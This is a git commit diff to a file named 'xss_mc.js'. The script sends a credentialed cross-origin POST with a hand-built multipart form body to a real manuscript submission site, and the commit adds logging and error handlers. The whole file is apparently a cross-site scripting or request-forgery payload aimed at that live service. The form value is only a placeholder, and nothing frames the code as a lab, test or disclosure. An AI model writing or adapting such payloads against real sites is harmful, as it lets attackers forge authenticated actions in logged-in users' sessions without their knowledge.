5b8417f94b9fc0817ffc4ca3c2eadc667865753b
Timothy Liptrot <60331709+tliptrot@users.noreply.github.com>
2024-03-28 19:49:06 -0400

    Update xss_mc.js

--- xss_mc.js
+++ xss_mc.js
@@ -1,11 +1,27 @@
 var xhr = new XMLHttpRequest();
 xhr.open("POST", "https://mc.manuscriptcentral.com/psrm", true);
-console.log("reached line 3");
+
+console.log("Opening request.");
+
 xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryXYZ");
 xhr.withCredentials = true;
+
+// Log successful completion of the request
+xhr.onload = function() {
+    console.log("Request completed with status: " + xhr.status);
+};
+
+// Log any errors that occur during the request
+xhr.onerror = function() {
+    console.log("Request failed.");
+};
+
 var body = "------WebKitFormBoundaryXYZ\r\n";
 body += "Content-Disposition: form-data; name=\"data\"\r\n\r\n";
-body += "plumbus \r\n";
+body += "plumbus\r\n";
 body += "------WebKitFormBoundaryXYZ--";
+
+console.log("Sending request.");
 xhr.send(body);
-console.log("reached the end");
+
+console.log("Reached the end of the script.");
